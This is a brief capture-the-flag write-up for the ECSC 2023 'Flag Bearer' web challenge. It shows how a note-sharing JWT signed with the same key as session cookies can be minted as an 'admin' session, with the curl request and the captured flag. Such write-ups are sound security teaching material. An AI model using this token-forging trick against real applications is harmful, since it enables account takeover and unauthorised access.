# [web - Flag Bearer](https://hack.cert.pl/challenge/flag-bearer)

The system is using JWT tokens for auth. After decoding a session cookie we get this payload:
```
{
  "name": "test2413"
}
```
Exactly the same payload has a token used for sharing notes. So getting admin's token is the matter of generating note named `admin`:
```bash
curl 'https://flag-bearer.ecsc23.hack.cert.pl/notes' \
    -H 'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGVzdDI0MTMifQ.ZV3dbSoRoGF55LaYWNhI1acugrz8HRbIjyblguDszkA' \
    -H 'Content-type: application/json' \
    --data '{"name":"admin","content":"test"}'
```
![](image.png)

Replace it with the session cookie and reload the website to read the flag.

### Flag
```
ecsc23{eyyyyyyyyyylmao}
```
